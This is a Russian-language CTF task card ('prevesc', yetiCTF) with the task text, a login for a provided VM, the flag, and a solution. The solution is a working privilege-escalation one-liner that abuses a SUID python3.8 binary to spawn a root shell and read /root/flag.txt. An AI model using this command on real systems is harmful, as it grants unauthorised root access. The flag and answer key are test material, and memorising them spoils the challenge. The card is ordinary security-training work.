# Название: 
prevesc
# Категория: 
admin
# Сообщение: 
У нас есть виртуальная машина хакера, но на ней ничего полезного мы не нашли, поможешь нам? Вот данные hacker:hacker123
 
# Флаг: 
yetiCTF{u_kn0w_su1d}

# Решение: 
SUID на фале pyhon3.8 python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")' cat /root/flag.txt

# Доп данные:
Ссылка на vm: https://drive.google.com/file/d/1AMqI189HGrsghhOHghgjY6vdhtThqVdY/view?usp=sharing
